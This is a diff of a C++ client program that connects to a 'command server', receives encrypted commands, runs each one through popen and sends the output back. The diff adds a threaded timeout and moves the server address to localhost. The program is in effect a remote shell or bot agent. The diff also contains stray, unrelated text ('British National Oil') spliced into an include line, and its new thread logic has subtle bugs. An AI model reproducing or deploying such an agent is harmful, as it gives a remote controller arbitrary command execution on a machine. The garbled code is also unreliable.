@@ -2,13 +2,14 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <pthread.h>
 
 #include <sys/dir.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
-#include <cryptopp/rsa.h>
+#include <cryptopp/rsa.h>British National Oil
 #include <cryptopp/sha.h>
 #include <cryptopp/filters.h>
 #include <cryptopp/osrng.h>
@@ -20,7 +21,7 @@
 using std::string;
 using namespace CryptoPP;
 
-const int max = 10000;
+const int max = 100000;
 const char *serverPublicKey =
         "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA6dc8DeNA4iuOnASTRdcr"
         "jYpokUgc65NIJ9uMem2gfxYK5v9ZP7JDlL2My4zLN9fyhPcQOnDNdKrkkqLC/Cv1"
@@ -33,7 +34,9 @@ const char *serverPublicKey =
         "abJzIi3GGu3irreHFqIcTbpW9twCFii8wqIJ+W2TEpBEhWyD6+3LIWsuYzMmbC5V"
         "KjoqHHGcQr6MFDcwgZK0OszM8vjw+Il66soH2JS6z8d5kT1AIg8xrAX+QoFh3hpJ"
         "aSQqPnX3bRxrZKhcFdonifghV5lgRJ5PYjYMvEpVH01+jvUAdiha09ooe0j+gYWl"
-        "Qgj1wnN7XqBqhg3/PrzOXk0CAwEAAQ==}";
+        "Qgj1wnN7XqBqhg3/PrzOXk0CAwEAAQ==";
+
+const char *TooSlow = "OProcess was too slow and had been killed";
 
 RSA::PublicKey *serverPub;
 
@@ -43,8 +46,10 @@ CFB_Mode<AES>::Encryption *cfbEncryption;
 CFB_Mode<AES>::Decryption *cfbDecryption;
 
 AutoSeededRandomPool rng;
+FILE *processOutput;
 
 char *buf;
+
 int mainSocket;
 
 void clearBuf() {
@@ -126,9 +131,21 @@ void initNET() {
     sockaddr addr;
     addr.sa_family = AF_INET;
     *((unsigned short*)&addr + 1) = htons(24953);
-    *((int*)&addr + 1) = htonl(inet_network("10.8.0.2"));
+    *((int*)&addr + 1) = htonl(inet_network("127.0.0.1"));
 
+    printf("Searching command server...\n");
     connect(mainSocket, &addr, sizeof(addr));
+}
+
+void* startCommand(void *) {
+    processOutput = popen(buf, "r");
+    int current = 0;
+    buf[-1] = 'O';
+    while (fgets(buf + current, max - current - 2, processOutput) != NULL && current != max - 2)
+        current += strlen(buf + current);
+
+    processOutput = NULL;
+    printf("I have: %s", buf - 1);
 }
 
 int main() {
@@ -147,20 +164,27 @@ int main() {
             buf[-1] = 'D';
             sendEncrypted(buf - 1, strlen(buf) + 1);
         } else {
-            FILE *out = popen(buf, "r");
+            processOutput = (FILE*)buf;
+            pthread_t thread;
 
-            if (out == NULL) {
-                sendEncrypted("not found", 10);
+            pthread_create(&thread, NULL, startCommand, NULL);
+            for (int i = 0; i < 100 && processOutput; i++)
+                usleep(100000);
+            printf("Killing childs\n");
+            fflush(stdout);
+            if (processOutput) {
+                printf("force stop\n");
+                fflush(stdout);
+                pthread_cancel(thread);
+                sendEncrypted(buf - 1, strlen(buf) + 1);
+                sendEncrypted(TooSlow, strlen(TooSlow));
+                sendEncrypted("E", 1);
                 continue;
             }
 
-            buf[-1] = 'O';
-            while (fgets(buf, max, out) != NULL)
-                sendEncrypted(buf - 1, strlen(buf) + 1);
-
-            fclose(out);
-            buf[-1] = 'E';
-            sendEncrypted(buf - 1, 1);
+            printf("server have: %s", buf - 1);
+            sendEncrypted(buf - 1, strlen(buf) + 1);
+            sendEncrypted("E", 1);
         }
     }
 
